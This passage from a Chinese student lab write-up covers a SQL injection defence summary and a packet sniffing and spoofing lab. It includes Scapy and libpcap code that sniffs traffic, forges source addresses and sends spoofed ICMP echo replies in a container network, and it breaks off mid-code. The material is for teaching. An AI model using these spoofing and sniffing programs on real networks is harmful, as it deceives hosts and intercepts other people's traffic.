class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存，重新dcbuild，dcup，再次访问&#x2F;defense页面，尝试进行sql注入攻击，发现用同样的sql注入手段已经无法成功获取到admin的数据了，证明预编译成功防御了这种sql注入攻击。</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><ol><li><p>SQL概述：SQL 注入攻击的方式多种多样，包括基于整数的注入、基于盲注的注入、基于字符的注入等多个方面。攻击者可以利用一些工具自动化地发现和利用 SQL 注入漏洞；除了<u>预防和修复 SQL 注入漏洞外</u>，还可以采用一些其他的安全措施，如<u>加强访问控制、使用加密技术、进行安全审计</u>等，从而提高 Web 应用程序的安全性。</p><ul><li><p>漏洞概念：SQL注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作。</p></li><li><p>漏洞原理：后端将前端提交的查询参数拼接到代码的 SQL 语句模板中进行查询，当攻击者提交带有非预期 sql 查询片段时，导致数据库被意外查询。</p></li><li><p>漏洞危害：数据库信息泄露。条件满足的情况下（能够通过数据库执行命令），导致服务器被接管</p></li></ul></li><li><p>修复思路</p><ul><li><p><u><strong>使用参数化查询</strong></u>：使用参数化查询可以将用户输入的数据作为参数传递给 SQL 语句，从而避免了恶意 SQL 注入的风险。</p></li><li><p>输入验证：对用户输入的数据进行验证，确保其符合预期的格式和类型。</p></li><li><p>转义字符：将特殊字符进行转义，从而避免其被误解为 SQL 语句的一部分。</p></li><li><p>最小化权限：将数据库用户的权限限制到最小，只授予其必要的权限。</p></li><li><p>使用ORM 框架：使用 ORM 框架可以将数据库操作抽象出来，从而避免手动编写 SQL语句的风险</p></li></ul></li></ol><h1 id="Lab9-嗅探与欺骗实验"><a href="#Lab9-嗅探与欺骗实验" class="headerlink" title="Lab9-嗅探与欺骗实验"></a>Lab9-嗅探与欺骗实验</h1><blockquote><p>使用Scapy来编写python程序，实现嗅探和欺骗——创建原始套接字需要root权限</p><p>嗅探数据包，BPF语法设置过滤器（filter）——filter&#x3D;’icmp’；filter&#x3D; ‘tcp and src host 10.9.0. 5 and port 23’；filter&#x3D; ‘ net 192.168.0.0&#x2F;16’</p><p>欺骗ICMP数据包——Scapy库发送一个ICMP数据包。创建一个IP对象a，设置目标地址，创建了一个ICMP对象b，将这两个对象组合成一个数据包p，使用send()函数发送</p><p>跟踪路由——使用Scapy来估算虚拟机和选定目的地之间的距离（路由器数量进行表示）。设置TTL字段来判断数据包是否到达了目的地，若数据包到达路由器则会正确返回响应。若数据包在传输过程中被某个路由器丢弃，则会返回错误信息。（设置TTL依次增加，抓包查看）</p><p>ARP协议的工作原理是通过广播方式在局域网中查询目标设备的MAC地址，从而实现了IP地址到MAC地址的映射</p><p>嗅探然后欺骗——接收参数pkt（捕获到的网络数据包）。在函数内部，首先打印出数据包的摘要信息，然后将ICMP数据包的类型设置为0（表示回复报文），并删除其校验和字段。接着，根据原始数据包的源IP、目标IP和ICMP数据包创建一个新的数据包newpkt，打印出新数据包的摘要信息，并通过send()发送新数据包</p><p>(1)   Internet上不存在的主机——原来没有回复，运行后有回复</p><p>(2)   局域网上一台不存在的主机——原来没有回复，运行后也没有回复（非局域网内，没有嗅探到数据包请求）</p><p>(3)   互联网上一台现有主机——原来有回复，运行后收到两份回复报文（冗余）</p><p>使用pcap编写一个简单的嗅探器程序（C语言）——使用libpcap库来捕获网络数据包。打开名为”enp0s3”的网络接口，然后设置一个过滤器（只捕获ICMP类型的数据包），将filter_exp编译成BPF伪代码，进入一个循环不断地捕获数据包，将每个捕获到的数据包传递给回调函数got_packet进行处理，最后关闭嗅探器接口。</p><p>使用混杂模式可以监听所在网段下其他机器的数据包，关闭则不能。</p><p>原始套接字允许程序员构建任意数据包，包括设置报头字段和有效载荷。使用原始套接字包括四个步骤：（1）创建原始套接字（2）设置套接字选项（3）构建数据包（4）通过原始套接字发送数据包。</p></blockquote><h2 id="2-1-Lab-Task-Set1-Using-Scapy-to-Sniff-and-Spoof-Packets"><a href="#2-1-Lab-Task-Set1-Using-Scapy-to-Sniff-and-Spoof-Packets" class="headerlink" title="2.1. Lab Task Set1. Using Scapy to Sniff and Spoof Packets"></a>2.1. Lab Task Set1. Using Scapy to Sniff and Spoof Packets</h2><p>目前有很多工具都可以用于嗅探和欺骗，大多数工具都只是提供固定的功能，但是Scapy不同，它的灵活度很高，允许用户构建定制的网络工具。使用Scapy，用户可以通过Python脚本直接控制和操作网络层次的数据包。</p><p>在Task Set 1中，所有的任务都会使用到Scapy。</p><h3 id="2-1-1-Task1-1-Sniffing-Packets"><a href="#2-1-1-Task1-1-Sniffing-Packets" class="headerlink" title="2.1.1. Task1.1 Sniffing Packets"></a>2.1.1. Task1.1 Sniffing Packets</h3><p>此Task的目的是学习如何使用Scapy在Python程序中进行数据包嗅探。</p><p>实验说明中给出了一段Python示例代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    pkt.show()</span><br><span class="line"></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-c9373e9f913&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>, prn=print_pkt)</span><br></pre></td></tr></table></figure><p>先查看本次实验所用到的network interface：br-12c77ce8b78a</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">br-12c77ce8b78a</span><br></pre></td></tr></table></figure><h4 id="2-1-1-1-Task1-1A"><a href="#2-1-1-1-Task1-1A" class="headerlink" title="2.1.1.1. Task1.1A."></a>2.1.1.1. Task1.1A.</h4><p>利用上面的示例程序抓取数据包，第一次使用root权限，第二次不使用root权限，观察两次运行结果并解释。</p><p><strong>实验步骤：</strong></p><p>先编写依照示例编写task1-1.py程序,</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    pkt.show()</span><br><span class="line"></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>,prn=print_pkt)</span><br></pre></td></tr></table></figure><p>赋予可执行权限，使用root权限编译运行，发现可以成功接收到ICMP数据包，并且打印出了数据包头的详细信息。不使用root权限，直接运行：发现无法成功运行，出现PermissionError。</p><p><strong>分析：</strong></p><p>在大多数情况下，嗅探网络流量需要系统的网络权限，而这通常需要root权限。这是因为嗅探网络流量可能涉及到**<u>底层的网络接口</u><strong>和</strong><u>数据包操作</u>**，这些需要更高的权限。</p><p>如果在没有 root 权限的情况下运行涉及网络嗅探的脚本，可能会遇到权限不足的错误。在这种情况下，使用 sudo 是一种常见的解决方案，以确保脚本有足够的权限执行网络操作。</p><h4 id="2-1-1-2-Task1-1B"><a href="#2-1-1-2-Task1-1B" class="headerlink" title="2.1.1.2. Task1.1B."></a>2.1.1.2. Task1.1B.</h4><p>网络上的数据包很多，如果在实际中对某个网络进行嗅探，对数据包进行过滤是非常重要的。本次Task的目标就是使用Scapy的Filter功能实现对数据包的过滤。Scapy的Filter使用BPF (Berkeley Packet Filter)语法。</p><p><strong>实验步骤：</strong></p><p>①<strong>只捕捉ICMP数据包</strong></p><p>修改sniff函数中filter参数的值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="comment">#   pkt.show()</span></span><br><span class="line"><span class="built_in">print</span>(pkt.summary())</span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>,prn=print_pkt)</span><br></pre></td></tr></table></figure><p>运行python程序，发现捕捉到的全是ICMP包。</p><p>②<strong>只捕获来自某个特定IP地址，目标端口为23的TCP数据包</strong></p><p>修改sniff函数中filter参数的值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">filter</span>=<span class="string">&#x27;tcp and src net 12.12.12.12 and dst port 23&#x27;</span></span><br></pre></td></tr></table></figure><p>代码修改如下，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="comment">#   pkt.show()</span></span><br><span class="line"><span class="built_in">print</span>(pkt.summary())</span><br><span class="line">    </span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;tcp and src host 12.12.12.12 and dst port 23&#x27;</span>,prn=print_pkt)</span><br></pre></td></tr></table></figure><p>再写一个发送数据包的python程序send.py：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">ip_pak = IP()</span><br><span class="line">ip_pak.src = <span class="string">&quot;12.12.12.12&quot;</span>  <span class="comment"># randomly set</span></span><br><span class="line">ip_pak.dst = <span class="string">&quot;10.9.0.6&quot;</span></span><br><span class="line"></span><br><span class="line">tcp_pak = TCP()</span><br><span class="line">tcp_pak.dport = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">send(ip_pak / tcp_pak)</span><br></pre></td></tr></table></figure><p>运行数据包嗅探程序，同时发送数据包，查看捕获的数据包的信息。发现捕获到的数据包都是符合代码中定义的过滤规则的。</p><p>③<strong>只捕获某个子网范围内的数据包</strong></p><p>修改sniff函数中filter参数的值，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">filter</span>=<span class="string">&#x27;net 12.12.12.0/24&#x27;</span></span><br></pre></td></tr></table></figure><p>只捕获与12.12.12.0&#x2F;24子网下的IP有关的数据包，代码如下，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="comment">#   pkt.show()</span></span><br><span class="line"><span class="built_in">print</span>(pkt.summary())</span><br><span class="line">    </span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;net 12.12.12.0/24&#x27;</span>,prn=print_pkt)</span><br></pre></td></tr></table></figure><p>运行数据包嗅探程序，同时使用<code>send.py</code>的python程序发送一些数据包，查看嗅探结果。捕获的数据包都是12.12.12.0&#x2F;24子网下的IP地址相关的数据包，表明filter过滤生效。</p><h3 id="2-1-2-Task1-2-Spoofing-ICMP-Packets"><a href="#2-1-2-Task1-2-Spoofing-ICMP-Packets" class="headerlink" title="2.1.2. Task1.2 Spoofing ICMP Packets"></a>2.1.2. Task1.2 Spoofing ICMP Packets</h3><p>本次task的目标是通过Scapy构造ICMP echo request数据包并发送，同时使用Wireshark工具观察现象。</p><p><strong>实验步骤：</strong></p><p>编写task1-2.py，发送spoofing数据包（先使用tcp，icmp的数据包见下方），</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip_pak = IP()</span><br><span class="line">ip_pak.src = <span class="string">&quot;12.12.12.12&quot;</span>  <span class="comment"># randomly set</span></span><br><span class="line">ip_pak.dst = <span class="string">&quot;10.9.0.6&quot;</span></span><br><span class="line">ip_pak.ttl = <span class="number">111</span>     <span class="comment">#0-255</span></span><br><span class="line"></span><br><span class="line">tcp_pak = TCP()</span><br><span class="line">tcp_pak.dport = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">send(ip_pak / tcp_pak)</span><br></pre></td></tr></table></figure><p>设置源ip地址为12.12.12.12，ttl值为111，</p><p>发送数据包，并且在Wireshark里查看，Wireshark已经捕捉到了刚刚发送的spoofing的数据包，以及10.9.0.6主机的回应的数据包，且ttl的值为111，证明是我们构造的数据包。分析略。</p><p>同理也可如下构造数据包（按照实验要求使用icmp），</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = IP()</span><br><span class="line">ip.src =<span class="string">&quot;12.12.12.12&quot;</span></span><br><span class="line">ip.dst =<span class="string">&quot;10.9.0.6&quot;</span></span><br><span class="line">ip.ttl = <span class="number">111</span>     <span class="comment">#0-255</span></span><br><span class="line"></span><br><span class="line">icmp=ICMP()</span><br><span class="line">send(ip/icmp)</span><br></pre></td></tr></table></figure><h3 id="2-1-3-Task1-3-Traceroute"><a href="#2-1-3-Task1-3-Traceroute" class="headerlink" title="2.1.3. Task1.3 Traceroute"></a>2.1.3. Task1.3 Traceroute</h3><p>本次task的目标是使用Scapy估计主机与目的主机之间的路由器的数量，即使用python代码实现traceroute工具所提供的功能。</p><p>**思路：**只需将一个数据包（任何类型）发送到目的地，首先将其TTL字段设置为1。这个数据包将被第一个路由器丢弃，它将向我们发送ICMP错误消息，告诉我们TTL已经结束。我们可以通过这个数据包获取第一个路由器的IP地址。然后，我们将TTL字段增加到2，发送另一个数据包，并获得第二个路由器的IP地址。我们将重复这个过程，直到我们的包裹最终到达目的地。</p><p><strong>实验步骤：</strong></p><p>编写task1-3.py，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">traceroute</span>(<span class="params">destination, max_hops=<span class="number">30</span></span>):</span><br><span class="line">    <span class="keyword">for</span> ttl <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_hops+<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#构造ICMP Echo请求</span></span><br><span class="line">        pkt = IP(dst=destination, ttl=ttl) / ICMP()</span><br><span class="line">        <span class="comment">#发送数据包并等待响应</span></span><br><span class="line">        response = sr1(pkt, timeout=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment">#未收到响应，可能是超时</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ttl&#125;</span>.***&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#收到响应，提取源IP地址和响应时间</span></span><br><span class="line">            src_ip = response.getlayer(IP).src</span><br><span class="line">            rtt = response.time * <span class="number">1000</span>  <span class="comment"># 转换成毫秒</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ttl&#125;</span>.<span class="subst">&#123;src_ip&#125;</span> <span class="subst">&#123;rtt:<span class="number">.2</span>f&#125;</span> ms&quot;</span>)</span><br><span class="line">        <span class="comment">#如果到达目标，结束循环</span></span><br><span class="line">            <span class="keyword">if</span> response.getlayer(ICMP).<span class="built_in">type</span> == <span class="number">0</span>:</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wzh Traceroute===&quot;</span>)</span><br><span class="line">    destination_ip = <span class="string">&quot;110.242.68.66&quot;</span>  <span class="comment"># baidu</span></span><br><span class="line">    traceroute(destination_ip)</span><br></pre></td></tr></table></figure><p>将destination_ip设为baidu.com的地址，运行task1-3.py，发现程序成功打印出了从VM到110.242.68.66(baidu.com)所经过的路由器的IP地址。</p><p><strong>分析：</strong></p><p>该代码使用Scapy库实现了类似Traceroute的功能。在每次循环中，它构造一个具有递增TTL值的ICMP Echo请求数据包，并通过网络发送。当数据包到达路由器时，路由器根据TTL减小数据包的数值，并在TTL为零时返回ICMP Time Exceeded消息。程序捕获并解析响应，提取源IP地址和响应时间，打印这些信息。如果收到Echo Reply（ICMP类型为0），表示已经到达目标，程序结束。如果在规定的超时时间内未收到响应，输出”* * *”表示超时。</p><p>如下代码也可实现，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">global</span> ttl</span><br><span class="line">ttl=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_ttl</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">global</span> ttl</span><br><span class="line">ttl=ttl+<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(pkt[ICMP].<span class="built_in">type</span>==<span class="number">0</span> <span class="keyword">and</span> pkt[IP].src==<span class="string">&#x27;110.242.68.66&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;get reply from target host while ttl=&#x27;</span>+<span class="built_in">str</span>(ttl))</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sniff...icmp reply&#x27;</span>)</span><br><span class="line">sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>,prn=count_ttl)</span><br></pre></td></tr></table></figure><h3 id="2-1-4-Task1-4-Sniffing-and-then-Spoofing"><a href="#2-1-4-Task1-4-Sniffing-and-then-Spoofing" class="headerlink" title="2.1.4. Task1.4 Sniffing and-then Spoofing"></a>2.1.4. Task1.4 Sniffing and-then Spoofing</h3><p>在本次task中，我们需要结合嗅探和欺骗技术实现一个Sniffing and-then Spoofing程序。</p><p>这个程序监控LAN中的数据包，一旦发现有ICMP echo request的数据包，无论目标IP地址是多少，都要立刻发送一个echo relpy至源主机。</p><p><strong>实验步骤：</strong></p><p>编写task1-4.py，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(ICMP) <span class="keyword">and</span> packet[ICMP].<span class="built_in">type</span> == <span class="number">8</span>:  <span class="comment"># Check for ICMP Echo Request (type 8)</span></span><br><span class="line">        src_ip = packet[IP].src</span><br><span class="line">        dst_ip = packet[IP].dst</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Received ICMP Echo Request from <span class="subst">&#123;src_ip&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建 ICMP Echo Reply 数据包</span></span><br><span class="line">        reply = IP(src=dst_ip, dst=src_ip, ttl=<span class="number">111</span>) / ICMP(<span class="built_in">type</span>=<span class="number">0</span>, <span class="built_in">id</span>=packet[ICMP].<span class="built_in">id</span>, seq=packet[ICMP].seq) / packet[Raw].load</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送 ICMP Echo Reply 数据包</span></span><br><span class="line">        send(reply)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Sent ICMP Echo Reply to <span class="subst">&#123;src_ip&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>, prn=packet_callback)</span><br></pre></td></tr></table></figure><p>在代码中我们将ttl值设置为111（作为Spoofing数据包的标识）。</p><p>运行task1-4.py开始监听，同时进入container，分别对以下ip地址进行ping操作，</p><p><code>ping 1.2.3.4</code> ，互联网中不存在的主机，hostA能接收到响应包，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.43.58.png" alt="截屏2025-01-03 14.43.58" style="zoom:25%;" /><p><code>ping 10.9.0.99</code>，局域网中不存在的主机<code>unreachable</code>，hostA**<u><em>向局域网内的主机发包不会经过网关</em></u>**，因此攻击机不会收到ICMP包，也就不会返回欺骗包。由于hostA找不到<code>10.9.0.99</code>的MAC地址，导致包不可达。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.44.22.png" alt="截屏2025-01-03 14.44.22" style="zoom:25%;" /><p><code>ping 8.8.8.8</code>，互联网中存在的主机，由于目标主机和攻击机都能收到ICMP包并做出响应，导致出现冗余包，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.44.10.png" alt="截屏2025-01-03 14.44.10" style="zoom:25%;" /><p><strong>结果描述以及分析：</strong></p><p>我们在VM上运行sniffing and-then spoofing程序之后，又在container中分别对Internet上不存在的主机、LAN中不存在的主机、Internet上存在的主机发送ICMP echo request数据包。</p><p><strong>发现</strong>：</p><p>①  对Internet上不存在的主机发出的ICMP echo request数据包是有回应的，但是这个回应是来自VM上的sniffing and-then spoofing程序；</p><p>②  但是对LAN中不存在的主机进行ping操作的时候，会提示Destination Host Unreachable，并且也不会受到运行在VM上的程序的回应；</p><p>③  对Internet上存在的主机发送的ICMP echo request数据包会受到两个回应，一个是运行在VM上的程序的回应，另一个则是来自目的主机真实的回应。</p><p><strong>原因分析</strong>：</p><p>首先需要明白以太网帧的头部：</p><p>计算机网络知识，在以太网帧的头部中，有非常重要的MAC地址，通常包含主机MAC地址和目的主机MAC地址。不同于IP地址，<strong><u>MAC地址主要用于局域网内设备之间的通信</u></strong>。<u><em>在跨网络通信中，以太网帧的目标 MAC 地址通常指向下一跳的路由器或者网关的 MAC 地址。</em></u></p><p>其次需要明白发送数据包时，目标主机在LAN内、外的区别。</p><ul><li><p>目标主机在LAN外的情况下，数据包通常需要经过路由器或者其他中间设备进行传输，而不是直接发送到目标主机。所以在这种情况下，发送方主机会将数据包发送到**<u>默认网关（默认网关和本机在相同LAN下）</u>**，而不需要知道目标主机的 MAC 地址。因为默认网关的 MAC 地址已知（通过ARP协议），发送方主机会将数据包发送到默认网关的 MAC 地址，然后默认网关进行下一步处理。 </p></li><li><p>而目标主机在LAN内的情况，本机会首先检查自己的 ARP 缓存，看是否已经存储了目标主机的 MAC 地址。如果 ARP 缓存中没有目标主机的 MAC 地址，发送方主机会发送一个 ARP 请求广播到LAN内，询问“谁是目标主机的 IP 地址”的 MAC 地址。目标主机收到 ARP 请求后，会回应该请求，将自己的 MAC 地址发送给发送方主机。发送方主机收到目标主机的 MAC 地址回应后，将这个 MAC 地址存储在自己的 ARP 缓存中，并将数据包发送到目标主机的 MAC 地址，以确保数据包被准确传递到目标主机。</p></li></ul><p>但是当LAN中不存在这个IP地址的时候，主机发送 ARP 请求，但是LAN内没有响应这个请求的主机，主机无法获得目标主机的MAC地址，那么这个数据包就会被丢弃。</p><p><strong>在我们观察到的结果中：</strong></p><p><u>对①的解释</u>：目标IP地址不在LAN内，所以封装好的以太网帧的目标MAC地址就是默认网关的MAC地址，然后数据包就会发送至默认网关，也就是VM，途中会经过VM上程序监听的网络接口，所以程序会捕获到container发送的数据包并且发送对应的spoofing数据包。</p><p><u>对②的解释</u>：目标IP地址在LAN内，container会先发现cache中是没有对应的MAC地址，然后在LAN内发送ARP广播，询问谁有10.9.0.99的MAC地址，显然没有回应。所以该数据包将由于缺少目标MAC地址而未能组成，根本没有发送出去，更没有经过那个网络接口，所以监听程序无法捕获到任何数据包，container也收不到任何回应。</p><p><u>对③的解释</u>：目标IP地址不在LAN中，那么由①的分析可以得出，数据包肯定会经过那个被监听的网络接口，所以监听程序会捕获到数据包，但是并没有对其作拦截操作，该数据包会正确到达目标主机，并且目标主机会返回<code>echo reply</code>数据包给container。这样container就会收到两种<code>echo reply</code>，一种是监听程序返回的spoofing数据包，另一种是正常的目标主机返回的echo reply数据包。</p><h2 id="2-2-Lab-Task-Set2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#2-2-Lab-Task-Set2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="2.2. Lab Task Set2. Writing Programs to Sniff and Spoof Packets"></a>2.2. Lab Task Set2. Writing Programs to Sniff and Spoof Packets</h2><h3 id="2-2-1-Task2-1-Writing-Packet-Sniffing-Program"><a href="#2-2-1-Task2-1-Writing-Packet-Sniffing-Program" class="headerlink" title="2.2.1. Task2.1 Writing Packet Sniffing Program"></a>2.2.1. Task2.1 Writing Packet Sniffing Program</h3><h4 id="2-2-1-1-Task2-1A-Understanding-How-a-Sniffer-Works（混杂模式）"><a href="#2-2-1-1-Task2-1A-Understanding-How-a-Sniffer-Works（混杂模式）" class="headerlink" title="2.2.1.1. Task2.1A Understanding How a Sniffer Works（混杂模式）"></a>2.2.1.1. Task2.1A Understanding How a Sniffer Works（混杂模式）</h4><p>参照实验说明所提供的资料，实现C程序task2-1.c，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pcap_t</span> *handle;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">    <span class="type">char</span> filter_exp[]=<span class="string">&quot;icmp&quot;</span>;</span><br><span class="line">    bpf_u_int32 net;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line">    handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Compile filter_exp into BPF pseudo-code</span></span><br><span class="line">    pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line">    <span class="keyword">if</span> (pcap_setfilter(handle, &amp;fp) != <span class="number">0</span>) &#123;</span><br><span class="line">        pcap_perror(handle, <span class="string">&quot;Error:&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它可以使得enp0s3网卡开启混杂模式，使那些mac地址与enp0s3不匹配的数据包也将被enp0s3网卡接收，并且程序会调用自定义的回调函数将数据包的信息打印出来。</p><p><strong>实验步骤：</strong></p><p>在这项task中，我们需要编写一个sniffer程序，打印出每个捕获数据包的源和目标IP地址。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="comment">/* This function will be invoked by pcap for each captured packet.</span></span><br><span class="line"><span class="comment">We can process each packet inside the function.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_ip</span><span class="params">(u_char* ipadd)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d.&quot;</span>,ipadd[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ipadd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,</span></span><br><span class="line"><span class="params"><span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span 